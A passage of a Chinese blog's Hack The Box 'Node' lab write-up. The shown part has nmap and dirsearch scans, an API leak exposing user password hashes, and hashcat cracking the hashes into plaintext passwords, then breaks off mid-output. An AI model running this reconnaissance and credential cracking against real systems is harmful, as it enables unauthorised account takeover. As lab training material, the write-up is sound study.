@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：js中API路径泄露、hashid识别密文类型、hashcat破解密文、wget添加cookie下载压缩包、file命令识别未知文件类型、mv命令移动文件为压缩包、fcrackzip工具破解压缩包密码、js数据库密码泄露、mongo数据库写计划任务、SUID提权、hydra爆破密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Node-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/05/Node-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：js中API路径泄露、hashid识别密文类型、hashcat破解密文、wget添加cookie下载压缩包、file命令识别未知文件类型、mv命令移动文件为压缩包、fcrackzip工具破解压缩包密码、js数据库密码泄露、mongo数据库写计划任务、SUID提权、hydra爆破密码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Node-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Node-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Node-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Node-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Node-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Node-htb-writeup/6.png">
+<meta property="article:published_time" content="2024-01-05T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-01-10T14:10:57.300Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Node-htb-writeup/1.png">
+  
+  
+  
+  <title>Node-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Node-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-05 23:50" pubdate>
+          2024年1月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          33k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          273 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Node-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：js中API路径泄露、hashid识别密文类型、hashcat破解密文、wget添加cookie下载压缩包、file命令识别未知文件类型、mv命令移动文件为压缩包、fcrackzip工具破解压缩包密码、js数据库密码泄露、mongo数据库写计划任务、SUID提权、hydra爆破密码</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://alamot.github.io/node_writeup/</code></p>
+<p>参考链接：<code>https://blog.luckolen.xyz/posts/HTB/Node</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.58</p>
+<p>2、扫描下开放端口的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.4]─[shiyan@htb-vrbwipiudk]─[~/Desktop]<br>└──╼ [★]$ sudo nmap  -p- -Pn --min-rate=10000 10.10.10.58<br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 09:16 GMT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.58<br>Host is up (0.28s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>3000/tcp open  ppp<br><br>┌─[us-vip-22]─[10.10.14.4]─[shiyan@htb-vrbwipiudk]─[~/Desktop]<br>└──╼ [★]$ sudo nmap -p22,3000 -sV -sC -Pn --min-rate=10000 10.10.10.58<br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 09:19 GMT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.58<br>Host is up (0.24s latency).<br><br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 dc5e34a625db43eceb40f4967b8ed1da (RSA)<br>|   256 6c8e5e5f4fd5417d1895d1dc2e3fe59c (ECDSA)<br>|_  256 d878b85d85ffad7be6e2b5da1e526236 (ED25519)<br>3000/tcp open  hadoop-datanode Apache Hadoop<br>| hadoop-tasktracker-info: <br>|_  Logs: /login<br>|_http-title: MyPlace<br>| hadoop-datanode-info: <br>|_  Logs: /login<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.44 seconds<br>┌─[us-vip-22]─[10.10.14.4]─[shiyan@htb-vrbwipiudk]─[~/Desktop]<br>└──╼ [★]$ sudo nmap -sU -p- -Pn --min-rate=10000 10.10.10.58<br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 09:20 GMT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.58<br>Host is up.<br>All 65535 scanned ports on 10.10.10.58 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 65535 open|filtered udp ports (no-response)<br></code></pre></td></tr></table></figure>
+
+<p>3、这里感觉openssh的版本有点问题，搜索下相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.4]─[shiyan@htb-vrbwipiudk]─[~/Desktop]<br>└──╼ [★]$ searchsploit OpenSSH 7.2p2<br>---------------------------------------------- ---------------------------------<br> Exploit Title                                |  Path<br>---------------------------------------------- ---------------------------------<br>OpenSSH 2.3 &lt; 7.7 - Username Enumeration      | linux/remote/45233.py<br>OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC | linux/remote/45210.py<br>OpenSSH 7.2 - Denial of Service               | linux/dos/40888.py<br>OpenSSH 7.2p2 - Username Enumeration          | linux/remote/40136.py<br>OpenSSH &lt; 7.4 - <span class="hljs-string">&#x27;UsePrivilegeSeparation Disab | linux/local/40962.txt</span><br><span class="hljs-string">OpenSSH &lt; 7.4 - agent Protocol Arbitrary Libr | linux/remote/40963.txt</span><br><span class="hljs-string">OpenSSH &lt; 7.7 - User Enumeration (2)          | linux/remote/45939.py</span><br><span class="hljs-string">OpenSSHd 7.2p2 - Username Enumeration         | linux/remote/40113.txt</span><br><span class="hljs-string">---------------------------------------------- ---------------------------------</span><br><span class="hljs-string">Shellcodes: No Results</span><br></code></pre></td></tr></table></figure>
+
+<p>4、行吧， 枚举漏洞应该不是的了</p>
+<p>5、看一下3000端口是什么服务吧</p>
+<p><code>http://10.10.10.58:3000/</code></p>
+<p><img src="http://sh1yan.top/photo/Node-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、是一个网站服务，继续扫描下目录情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.4]─[shiyan@htb-vrbwipiudk]─[~/Desktop]<br>└──╼ [★]$ dirsearch -u http://10.10.10.58:3000/<br>Directory /usr/lib/python3/dist-packages/dirsearch is not writable<br>Directory /usr/lib/python3/dist-packages/dirsearch is not writable<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30<br>Wordlist size: 10903<br><br>Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.58:3000/-_24-01-05_09-28-12.txt<br><br>Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-24-01-05_09-28-12.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.58:3000/<br><br>[09:28:13] Starting: <br>[09:28:57] 301 -  171B  - /assets  -&gt;  /assets/<br>[09:29:47] 301 -  173B  - /uploads  -&gt;  /uploads/<br><br>Task Completed<br>&lt;dirsearch.dirsearch.Program object at 0x7fa52299db50&gt;<br></code></pre></td></tr></table></figure>
+
+<p>7、到这里，要么是字典不够强大，要么就是在js里隐藏着一些信息，去js里翻看下</p>
+<p><img src="http://sh1yan.top/photo/Node-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、发现了一个API路径，通过页面访问下看看吧</p>
+<p><code>http://10.10.10.58:3000/api/users/latest</code></p>
+<p><img src="http://sh1yan.top/photo/Node-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://10.10.10.58:3000/api/users/latest           <br>[&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59a7368398aa325cc03ee51d&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;tom&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">false</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59a7368e98aa325cc03ee51e&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;mark&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">false</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59aa9781cced6f1d1490fce9&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;rastating&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">false</span>&#125;] <br></code></pre></td></tr></table></figure>
+
+<p>9、在该API的二级目录下发现了一些信息</p>
+<p><code>http://10.10.10.58:3000/api/users/</code></p>
+<p><img src="http://sh1yan.top/photo/Node-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://10.10.10.58:3000/api/users/      <br>[&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59a7365b98aa325cc03ee51c&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;myP14ceAdm1nAcc0uNT&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">true</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59a7368398aa325cc03ee51d&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;tom&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">false</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59a7368e98aa325cc03ee51e&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;mark&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">false</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59aa9781cced6f1d1490fce9&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;rastating&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;</span>,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">false</span>&#125;]  <br></code></pre></td></tr></table></figure>
+
+<p>10、比上面那个列表多了一个管理员的账号信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;59a7365b98aa325cc03ee51c&quot;</span>,<br><span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;myP14ceAdm1nAcc0uNT&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;</span>,<br><span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>11、这里尝试使用 hashid 看看，能否区分开这些是什么加密的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&#x27;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#x27;</span> | hashid<br>Analyzing <span class="hljs-string">&#x27;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#x27;</span><br>[+] Snefru-256 <br>[+] SHA-256 <br>[+] RIPEMD-256 <br>[+] Haval-256 <br>[+] GOST R 34.11-94 <br>[+] GOST CryptoPro S-Box <br>[+] SHA3-256 <br>[+] Skein-256 <br>[+] Skein-512(256) <br></code></pre></td></tr></table></figure>
+
+<p>12、把上述账号密码，放入到一个文本里，然后使用hashcat进行破解下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;myP14ceAdm1nAcc0uNT:dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</span><br><span class="hljs-string">quote&gt; tom:f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240</span><br><span class="hljs-string">quote&gt; mark:de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73</span><br><span class="hljs-string">quote&gt; rastating:5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#x27;</span> &gt; hashes<br><br>shiyan@InfoSec hashcat-6.2.6 % sudo hashcat --user ./test/hashes ./dict-list/darkweb2017-top10000.txt -m 1400<br>hashcat (v6.2.6) starting<br><br>* Device <span class="hljs-comment">#2: Apple&#x27;s OpenCL drivers (GPU) are known to be unreliable.</span><br>             You have been warned.<br><br>METAL API (Metal 341.29)<br>========================<br>* Device <span class="hljs-comment">#1: Apple M2 Pro, 5408/10922 MB, 19MCU</span><br><br>OpenCL API (OpenCL 1.2 (Sep 30 2023 03:48:09)) - Platform <span class="hljs-comment">#1 [Apple]</span><br>====================================================================<br>* Device <span class="hljs-comment">#2: Apple M2 Pro, skipped</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 4 digests; 4 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Salt<br>* Raw-Hash<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 100c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 333 MB<br><br>Dictionary cache built:<br>* Filename..: ./dict-list/darkweb2017-top10000.txt<br>* Passwords.: 9999<br>* Bytes.....: 82603<br>* Keyspace..: 9999<br>* Runtime...: 0 secs<br><br>The wordlist or mask that you are using is too small.<br>This means that hashcat cannot use the full parallel power of your device(s).<br>Unless you supply more work, your cracking speed will drop.<br>For tips on supplying more work, see: https://hashcat.net/faq/morework<br><br>Approaching final keyspace - workload adjusted.           <br><br>f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob<br>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester<br>de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake<br>                                                          <br>Session..........: hashcat<br>Status...........: Exhausted<br>Hash.Mode........: 1400 (SHA2-256)<br>Hash.Target......: ./test/hashes<br>Time.Started.....: Fri Jan  5 22:15:29 2024 (1 sec)<br>Time.Estimated...: Fri Jan  5 22:15:30 2024 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (./dict-list/darkweb2017-top10000.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:  3417.3 kH/s (0.12ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span><br>Recovered........: 3/4 (75.00%) Digests (total), 3/4 (75.00%) Digests 